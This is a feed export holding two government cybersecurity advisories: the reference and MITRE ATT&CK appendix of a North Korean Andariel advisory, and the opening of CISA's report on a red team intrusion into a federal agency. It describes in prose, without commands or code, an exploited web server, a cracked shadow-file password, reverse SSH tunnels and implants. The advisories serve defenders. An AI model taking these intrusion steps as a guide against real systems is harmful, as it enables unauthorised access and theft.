<p><strong>NSA Defense Industrial Base Inquiries and Cybersecurity Services:&nbsp;</strong><a href=\"mailto:DIB_Defense@cyber.nsa.gov\" title=\"NSA Defense Industrial Base Inquiries and Cybersecurity Services\">DIB_Defense@cyber.nsa.gov</a></p>
<p><strong>NSA Media Inquiries / Press Desk:&nbsp;</strong>443-634-0721, <a href=\"mailto:MediaRelations@nsa.gov\" title=\"NSA Media Inquiries / Press Desk\">MediaRelations@nsa.gov</a></p>
<p><strong>Republic of Korea organizations:</strong> If you suspect cyber incidents involving state actors, including Andariel, or discover similar cases, please contact the relevant authorities below.</p>
<p><strong>National Intelligence Service:&nbsp;</strong><a href=\"http://www.nis.go.kr\" title=\"National Intelligence Service\">www.nis.go.kr</a>, +82 111</p>
<h2><strong>References</strong></h2>
<p>AhnLab Security Emergency Response Center:</p>
<ul>
<li><a href=\"https://asec.ahnlab.com/en/56405/\" title=\"Analysis of Andariel’s New Attack Activities\">https://asec.ahnlab.com/en/56405/</a></li>
<li><a href=\"https://asec.ahnlab.com/en/59073/\" title=\"Circumstances of an Attack Exploiting an Asset Management Program (Andariel Group)\">https://asec.ahnlab.com/en/59073/</a></li>
<li><a href=\"https://asec.ahnlab.com/en/66088/\" title=\"Analysis of APT Attack Cases Using Dora RAT Against Korean Companies (Andariel Group)\">https://asec.ahnlab.com/en/66088/</a></li>
</ul>
<p>Boredhackerblog: <a href=\"http://www.boredhackerblog.info/2022/11/openssl-100-fipps-linux-backdoor-notes.html\" title=\"boredhackerblog\">http://www.boredhackerblog.info/2022/11/openssl-100-fipps-linux-backdoor-notes.html</a></p>
<p>Cisco Talos Intelligence blogs:</p>
<ul>
<li><a href=\"https://blog.talosintelligence.com/lazarus-three-rats/\" title=\"Lazarus and the tale of three RATs\">https://blog.talosintelligence.com/lazarus-three-rats/</a>&nbsp;</li>
<li><a href=\"https://blog.talosintelligence.com/lazarus-magicrat/\" title=\"MagicRAT: Lazarus’ latest gateway into victim networks\">https://blog.talosintelligence.com/lazarus-magicrat/</a></li>
<li><a href=\"https://blog.talosintelligence.com/lazarus-collectionrat/\" title=\"Lazarus Group's infrastructure reuse leads to discovery of new malware\">https://blog.talosintelligence.com/lazarus-collectionrat/</a></li>
<li><a href=\"https://blog.talosintelligence.com/lazarus-quiterat/\" title=\"Lazarus Group exploits ManageEngine vulnerability to deploy QuiteRAT\">https://blog.talosintelligence.com/lazarus-quiterat/</a></li>
</ul>
<p>DCSO blog: <a href=\"https://medium.com/@DCSO_CyTec/andariels-jupiter-malware-and-the-case-of-the-curious-c2-dbfe29f57499\" title=\"Andariel’s “Jupiter” malware and the case of the curious C2\">https://medium.com/@DCSO_CyTec/andariels-jupiter-malware-and-the-case-of-the-curious-c2-dbfe29f57499</a></p>
<p>Github.com/ditekshen: <a href=\"https://github.com/ditekshen/detection/blob/master/yara/indicator_packed.yar\" title=\"ditekshen / detection\">https://github.com/ditekshen/detection/blob/master/yara/indicator_packed.yar</a></p>
<p>JPCERT blogs:</p>
<ul>
<li><a href=\"https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html\" title=\"Lazarus Attack Activities Targeting Japan (VSingle/ValeforBeta)\">https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html</a></li>
<li><a href=\"https://blogs.jpcert.or.jp/en/2022/07/yamabot.html\" title=\"YamaBot Malware Used by Lazarus\">https://blogs.jpcert.or.jp/en/2022/07/yamabot.html</a></li>
</ul>
<p>Mandiant blogs:</p>
<ul>
<li><a href=\"https://www.mandiant.com/resources/blog/north-korea-cyber-structure-alignment-2023\" title=\"Assessed Cyber Structure and Alignments of North Korea in 2023\">https://www.mandiant.com/resources/blog/north-korea-cyber-structure-alignment-2023</a></li>
<li><a href=\"https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government\" title=\"Not So Lazarus: Mapping DPRK Cyber Threat Groups to Government Organizations\">https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government</a></li>
</ul>
<p>Microsoft blogs:</p>
<ul>
<li><a href=\"https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/\" title=\"Multiple North Korean threat actors exploiting the TeamCity CVE-2023-42793 vulnerability\">https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/</a></li>
<li><a href=\"https://www.microsoft.com/en-us/security/blog/2022/07/14/north-korean-threat-actor-targets-small-and-midsize-businesses-with-h0lygh0st-ransomware/\" title=\"North Korean threat actor targets small and midsize businesses with H0lyGh0st ransomware\">https://www.microsoft.com/en-us/security/blog/2022/07/14/north-korean-threat-actor-targets-small-and-midsize-businesses-with-h0lygh0st-ransomware/</a></li>
</ul>
<p>NSCS Guidance:</p>
<ul>
<li>Alert: Apache Log4j Vulnerabilities: <a href=\"https://www.ncsc.gov.uk/news/apache-log4j-vulnerability\" title=\"Alert: Apache Log4j vulnerabilities\">https://www.ncsc.gov.uk/news/apache-log4j-vulnerability</a></li>
<li>Information: <a href=\"https://www.ncsc.gov.uk/information/log4j-vulnerability-what-everyone-needs-to-know\" title=\"Log4j vulnerability - what everyone needs to know\">https://www.ncsc.gov.uk/information/log4j-vulnerability-what-everyone-needs-to-know</a></li>
</ul>
<p>Symantec blog: <a href=\"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/clasiopa-materials-research\" title=\"Clasiopa: New Group Targets Materials Research\">https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/clasiopa-materials-research</a></p>
<p>VMware blog: <a href=\"https://blogs.vmware.com/security/2021/12/tigerrat-advanced-adversaries-on-the-prowl.html\" title=\"TigerRAT – Advanced Adversaries on the Prowl\">https://blogs.vmware.com/security/2021/12/tigerrat-advanced-adversaries-on-the-prowl.html</a></p>
<p>WithSecure Labs report: <a href=\"https://labs.withsecure.com/publications/no-pineapple-dprk-targeting-of-medical-research-and-technology-sector\" title=\"No Pineapple! –DPRK Targeting of Medical Research and Technology Sector\">https://labs.withsecure.com/publications/no-pineapple-dprk-targeting-of-medical-research-and-technology-sector</a></p>
<h2><strong>Appendix: MITRE ATT&amp;CK Techniques and Software</strong></h2>
<p>The tactics and techniques referenced in this advisory are identified in Table 3 – Table 12.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;3. Reconnaissance and Enumeration</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Gather Victim Org Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1591\" title=\"Gather Victim Org Information \">T1591</a></td>
<td>The actors gather information about the victim’s organization that can be used during targeting.</td>
</tr>
<tr>
<td>Gather Victim Host Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1592\" title=\"Gather Victim Host Information\">T1592</a></td>
<td>The actors gather information about the victim’s hosts that can be used during targeting.</td>
</tr>
<tr>
<td>Active Scanning</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/\" title=\"Active Scanning\">T1595</a></td>
<td>The actors execute active reconnaissance scans to gather information that can be used during targeting.</td>
</tr>
<tr>
<td>Search Open Technical Databases</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/\" title=\"Search Open Technical Databases\">T1596</a></td>
<td>The actors search freely available technical databases for information about victims that can be used during targeting.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4. Resource Development, Tooling, and Remote Access Tools (RATs)</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a></td>
<td>The actors attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.</td>
</tr>
<tr>
<td>Exfiltration Over Alternative Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1048\" title=\"Exfiltration Over Alternative Protocol\">T1048</a></td>
<td>The actors steal data by exfiltrating it over a different protocol than that of the existing command and control channel.</td>
</tr>
<tr>
<td>Proxy</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a></td>
<td>The actors use a connection proxy to direct network traffic between systems or act as intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.</td>
</tr>
<tr>
<td>Archive Collected Data</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a></td>
<td>The actors compress and/or encrypt data that is collected prior to exfiltration.</td>
</tr>
<tr>
<td>Protocol Tunneling</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a></td>
<td>The actors tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.</td>
</tr>
<tr>
<td>Develop Capabilities: Malware</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1587/001/\" title=\"Develop Capabilities: Malware\">T1587.001</a></td>
<td>The actors develop malware and malware components that can be used during targeting.</td>
</tr>
<tr>
<td>Develop Capabilities: Exploits</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1587/004/\" title=\"Develop Capabilities: Exploits\">T1587.004</a></td>
<td>The actors develop exploits that can be used during targeting.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5. Software used for Resource Development, Tooling, and RATs</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Software Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Mimikatz</td>
<td><a href=\"https://attack.mitre.org/versions/v15/software/S0002/\" title=\"Mimikatz\">S0002</a></td>
<td>The actors use a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks.</td>
</tr>
<tr>
<td>AdFind</td>
<td><a href=\"https://attack.mitre.org/versions/v13/software/S0552/\" title=\"AdFind\">S0552</a></td>
<td>The actors use a free command-line query tool that can be used for gathering information from the Active Directory.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6. Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>The actors attempt to exploit a weakness in an Internet-facing host or system to initially access a network.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7. Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/\" title=\"Command and Scripting Interpreter\">T1059</a></td>
<td>The actors abuse command and script interpreters to execute commands, scripts, or binaries.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8. Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Obfuscated Files or Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1027/\" title=\"Obfuscated Files or Information\">T1027</a></td>
<td>The actors attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its content on the system or in transit.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9. Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a></td>
<td>The actors attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10. Discovery and Lateral Movement</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Services</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021\" title=\"Remote Services\">T1021</a></td>
<td>The actors use valid accounts to log into a service that accepts remote connections, such as telnet, SSH, and VNC.</td>
</tr>
<tr>
<td>Remote Services: SMB/Windows Admin Shares</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/002\" title=\"Remote Services: SMB/Windows Admin Shares\">T1021.002</a></td>
<td>The actors use valid accounts to interact with a remote network share using Server Message Block (SMB).</td>
</tr>
<tr>
<td>File and Directory Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1083\" title=\"File and Directory Discovery\">T1083</a></td>
<td>The actors enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.</td>
</tr>
<tr>
<td>Account Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1087\" title=\"Account Discovery\">T1087</a></td>
<td>The actors attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11. Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Application Layer Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/\" title=\"Application Layer Protocol\">T1071</a></td>
<td>The actors establish command and control capabilities over commonly used application layer protocols such as HTTP(S), OPC, telnet, DNP3, and Modbus.</td>
</tr>
<tr>
<td>Proxy</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a></td>
<td>The actors use a connection proxy to direct network traffic between systems or act as an intermediary for network communications.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;12. Collection and Exfiltration</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data from Network Shared Drive</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1039\" title=\"Data from Network Shared Drive\">T1039</a></td>
<td>The actors search network shares on computers they have compromised to find files of interest.</td>
</tr>
<tr>
<td>Exfiltration Over Alternative Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1048\" title=\"Exfiltration Over Alternative Protocol\">T1048</a></td>
<td>The actors steal data by exfiltrating it over a different protocol than that of the existing command and control server.</td>
</tr>
<tr>
<td>Archive Collected Data</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a></td>
<td>The actors compress and/or encrypt data that is collected prior to exfiltration.</td>
</tr>
<tr>
<td>Exfiltration Over Web Service</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1567\" title=\"Exfiltration Over Web Service\">T1567</a></td>
<td>The actors use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel.</td>
</tr>
</tbody>
</table>
</div>
</div>
") (pubDate nil "Wed, 24 Jul 2024 12:37:18 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/21832"))) ("CISA Red Team’s Operations Against a Federal Civilian Executive Branch Organization Highlights the Necessity of Defense-in-Depth" "<h3>EXECUTIVE SUMMARY</h3>
<p>In early 2023, the Cybersecurity and Infrastructure Security Agency (CISA) conducted a SILENTSHIELD red team assessment against a Federal Civilian Executive Branch (FCEB) organization. During SILENTSHIELD assessments, the red team first performs a no-notice, long-term simulation of nation-state cyber operations. The team mimics the techniques, tradecraft, and behaviors of sophisticated threat actors and measures the potential dwell time actors have on a network, providing a realistic assessment of the organization’s security posture. Then, the team works directly with the organization’s network defenders, system administrators, and other technical staff to address strengths and weaknesses found during the assessment. The team’s goal is to assist the organization with refining their detection, response, and hunt capabilities—particularly hunting unknown threats.</p>
<p>In coordination with the assessed organization, CISA is releasing this Cybersecurity Advisory (CSA) detailing the red team’s activity and tactics, techniques, and procedures (TTPs); associated network defense activity; and lessons learned to provide network defenders with recommendations for improving their organization’s detection capabilities and cyber posture.</p>
<p>During the first phase, the SILENTSHIELD team gained initial access by exploiting a known vulnerability in an unpatched web server in the victim’s Solaris enclave. Although the team fully compromised the enclave, they were unable to move into the Windows portion of the network due to a lack of credentials. In a parallel effort, the team gained access to the Windows network through phishing. They then discovered unsecured administrator credentials, allowing them to pivot freely throughout the Windows environment, which resulted in full domain compromise and access to tier zero assets. The team then identified that the organization had trust relationships with multiple external partner organizations and was able to exploit and pivot to an external organization. The red team remained undetected by network defenders throughout the first phase.</p>
<p><strong>The red team’s findings underscored the importance of defense-in-depth and using diversified layers of protection.</strong>&nbsp;The organization was only able to fully understand the extent of the red team’s compromise by running full diagnostics from all data sources. This involved analyzing&nbsp;host-based logs, internal network logs, external (egress) network logs, and authentication logs.</p>
<p>The red team’s findings also demonstrated the value of using tool-agnostic and behavior-based indicators of compromise (IOCs) and of applying an “allowlist” approach to network behavior and systems, rather than a “denylist” approach, which predominantly results in an unmanageable amount of noise. The red team’s findings illuminated the following lessons learned for network defenders about how to reduce and respond to risk:</p>
<ul>
<li><strong>Lesson learned:</strong>&nbsp;The assessed organization had insufficient controls to prevent and detect malicious activity.</li>
<li><strong>Lesson learned:</strong> The organization did not effectively or efficiently collect, retain, and analyze logs.</li>
<li><strong>Lesson learned:</strong> Bureaucratic processes and decentralized teams hindered the organization’s network defenders.</li>
<li><strong>Lesson learned:</strong> A “known-bad” detection approach hampered detection of alternate TTPs.</li>
</ul>
<p>To reduce risk of similar malicious cyber activity, CISA encourages organizations to apply the recommendations in the Mitigations section of this advisory, including those listed below:</p>
<ul>
<li><strong>Apply defense-in-depth principles</strong> by using multiple layers of security to ensure comprehensive analysis and detection of possible intrusions.</li>
<li><strong>Use robust network segmentation</strong> to impede lateral movement across the network.</li>
<li><strong>Establish baselines of network traffic, application execution, and account authentication</strong>. Use these baselines to enforce an “allowlist” philosophy rather than denying known-bad IOCs. Ensure monitoring and detection tools and procedures are primarily behavior-based, rather than IOC-centric.</li>
</ul>
<p>CISA recognizes that insecure software contributes to these identified issues and urges software manufacturers to embrace&nbsp;<a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design</a> principles and implement&nbsp;the recommendations in the Mitigations section of this CSA, including those listed below, to&nbsp;harden customer networks against malicious activity and reduce the likelihood of domain compromise:</p>
<ul>
<li><strong>Eliminate default passwords.</strong></li>
<li><strong>Provide logging at no additional charge</strong>.</li>
<li><strong>Work with security information and event management (SIEM) and security orchestration, automation, and response (SOAR) providers</strong>—in conjunction with customers—to understand how response teams use logs to investigate incidents.</li>
</ul>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-07/csa-cisa-red-team%27s-operations-against-a-fceb-organization-highlights-the-necessity-of-defense-in-depth_0.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-193A CISA Red Team’s Operations Against a Federal Civilian Executive Branch Organization Highlights the Necessity of Defense-in-Depth</a>
    <span class=\"c-file__size\">(PDF,       1.18 MB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-10/csa-cisa-red-team_s-operations-against-a-fceb-organization-highlights-the-necessity-of-defense-in-depth_0_ES.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-193A CISA Red Team’s Operations Against a Federal Civilian Executive Branch Organization Highlights the Necessity of Defense-in-Depth - Spanish Translation</a>
    <span class=\"c-file__size\">(PDF,       1.06 MB
  )</span>
  </div>
</div>
<h3>INTRODUCTION</h3>
<p>CISA has authority to hunt for and identify, with or without advance notice to or authorization from agencies, threats and vulnerabilities within federal information systems (see generally 44 U.S.C. § 3553[b][7]). The target organization for this assessment was a large U.S. FCEB organization. CISA conducted the SILENTSHIELD assessment over an approximately eight-month period in 2023, with three of the months consisting of a technical collaboration phase:</p>
<ul>
<li><strong>Adversary Emulation Phase:&nbsp;</strong>The team<strong>&nbsp;</strong>started by<strong>&nbsp;</strong>emulating a sophisticated nation-state actor by simulating known initial access and post-exploitation TTPs. The team’s goal was to compromise the assessed organization’s domain and identify attack paths to other networks. After completion of their initial objectives, the team diversified its deployed tools and tradecraft to mimic a wider and often less sophisticated set of threat actors to elicit network defender attention. CISA red team members did not clean up or delete system logs, allowing defenders to investigate all artifacts and identify the full scope of a breach.</li>
<li><strong>Collaboration Phase:</strong> The SILENTSHIELD team met regularly with senior staff and technical personnel to discuss issues with the organization’s cyber defensive capabilities. During this phase, the team:
<ul>
<li>Proposed new behavior-based and tool-agnostic detections to uncover additional tradecraft used during the Adversary Emulation Phase. They also evaluated the organization’s improvements according to current CISA priorities and public guidance.</li>
<li>Troubleshot existing detection steps to show how certain TTPs evaded IOC-based detections.</li>
<li>Deconflicted events from CISA red team activity, indicating unexpected network/application behavior or the potential presence of a real adversary in the network.<br><br><strong>Note:</strong> The team’s goal during this phase was to build the organization’s ability to detect malicious activity based on adversary behavior (i.e., TTPs) vice relying on known IOCs.</li>
</ul>
</li>
</ul>
<p>This advisory, drafted in coordination with the assessed organization, details the red team’s activity and TTPs, associated network defense activity, and lessons learned to provide network defenders recommendations for improving their organization’s defensive cyber posture. The advisory also provides recommendations to software manufacturers to harden their customer networks against malicious activity and reduce the likelihood of domain compromise.</p>
<h3>TECHNICAL DETAILS</h3>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK for Enterprise</a> framework, version 15. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.&nbsp;</p>
<p>During the Adversary Emulation phase, the red team gained initial access to the organization’s Solaris enclave by exploiting a known vulnerability in an unpatched web server. They gained separate access to the Windows environment by phishing and were able to compromise the full domain and its parent domain.&nbsp;See Figure 1 for a timeline of this assessment and the sections below for details on the team’s activity and TTPs.</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%201%20-%20SILENTSHIELD%20Assessment%20Timeline.jpg?itok=-GInuA5O\" width=\"1024\" height=\"571\" alt=\"Figure 1: SILENTSHIELD Assessment Timeline\">


</div>
  </figure>
<h6>Figure 1: SILENTSHIELD assessment timeline</h6>
<h3>Adversary Emulation Phase</h3>
<h4><em>Exploitation of the Solaris Enclave</em></h4>
<h5><em>Reconnaissance, Initial Access, and Command and Control</em></h5>
<p>CISA’s red team used open source tools and third-party services to probe the organization’s internet-facing surface [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1594/\" title=\"Search Victim-Owned Websites\">T1594</a>]. This included non-intrusive port scans for common ports and Domain Name System (DNS) enumeration [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1590/002/\">T1590.002</a>]. These efforts revealed the organization’s web server was unpatched for <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21587\" title=\"CVE-2022-21587 Detail\">CVE-2022-21587</a>, an unauthenticated remote code execution (RCE) vulnerability in Oracle Web Applications Desktop Integrator. For three months the assessed organization failed to patch this vulnerability, and the team exploited it for initial access.</p>
<p>The exploit provided code execution on a backend application server (SERVER 1) that handled incoming requests from the public-facing web server. The red team used this exploit to upload and run a secure Python remote access tool (RAT). Because the application server had full external internet egress via Transmission Control Protocol (TCP) ports <code>80</code> and <code>443</code>, the RAT enabled consistent command and control (C2) traffic [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a>].</p>
<p><strong>Note:</strong> After gaining access, the team promptly informed the organization’s trusted agents of the unpatched device, but the organization took over two weeks to apply the available patch. Additionally, the organization did not perform a thorough investigation of the affected servers, which would have turned up IOCs and should have led to a full incident response. About two weeks after the team obtained access, exploit code was released publicly into a popular open source exploitation framework. CISA identified that the vulnerability was exploited by an unknown third party. CISA added this CVE to its&nbsp;<a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">Known Exploited Vulnerabilities Catalog</a> on Feb. 2, 2023.</p>
<h5><em>Credential Access, Command and Control, and Privilege Escalation</em></h5>
<p>Once on SERVER 1, the red team probed the host’s files and folder structure [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1005/\" title=\"Data from Local System\">T1005</a>] and identified several old and globally accessible <code>.tar</code> backup files, which included a readable copy of an <code>/etc/shadow</code> file containing the hash for a privileged service account (ACCOUNT 1). The team quickly cracked the account’s weak password using a common wordlist [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/002/\" title=\"Brute Force: Password Cracking\">T1110.002</a>]. They then established an outbound Secure Shell Protocol (SSH) connection over TCP port <code>80</code> and used a reverse tunnel to SSH back into SERVER 1, where they were prompted to reset ACCOUNT 1’s expired password [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1571/\" title=\"Non-Standard Port\">T1571</a>] (see Figure 2). The team identified the account was enabled on a subset of containers, but it had not been actively used in a significant amount of time; the team changed this account’s password to a strong password.</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%202%20-%20Exploitation%20of%20the%20Solaris%20Enclave.jpg?itok=zdaEEFmf\" width=\"1024\" height=\"597\" alt=\"Figure 2: Exploitation of the Solaris Enclave\">


</div>
  </figure>
<h6>Figure&nbsp;2: Exploitation of the Solaris Enclave</h6>
<p>The team discovered ACCOUNT 1 was a local administrator with <code>sudo/root</code>&nbsp;access and used it to move laterally (see the next section).</p>
<h5><em>Lateral Movement and Persistence</em></h5>
<p>Servers in the Solaris enclave did not use centralized authentication but had a mostly uniform set of local accounts and permissions [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a>]. This allowed the red team to use ACCOUNT 1 to move through much of the network segment via SSH [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/004/\" title=\"Remote Services: SSH\">T1021.004</a>].</p>
<p>Some servers allowed external internet access and the team deployed RATs on a few of these hosts for C2. They deployed several different RATs to diversify network traffic signatures and obfuscate the on-disk and in-memory footprints. These tools communicated to a red team redirector over TCP/<code>443</code>, through valid HTTPS messages, and over SSH through non-standard ports (<code>80</code> and <code>443</code>) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1571/\" title=\"Non-Standard Port\">T1571</a>]. Much of the traffic was not blocked by a firewall, and the organization lacked application layer firewalls capable of detecting protocol mismatches on common ports.&nbsp;</p>
<p>The team then moved laterally to multiple servers, including high value assets, that did not allow internet access. Using reverse SSH tunnels, the team moved into the environment and used a SOCKS proxy [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>] to progress forward through the network. They configured implants with TCP bind listeners bound to random high ports to connect directly with some of these hosts without creating new SSH login events (see Figure 3).</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
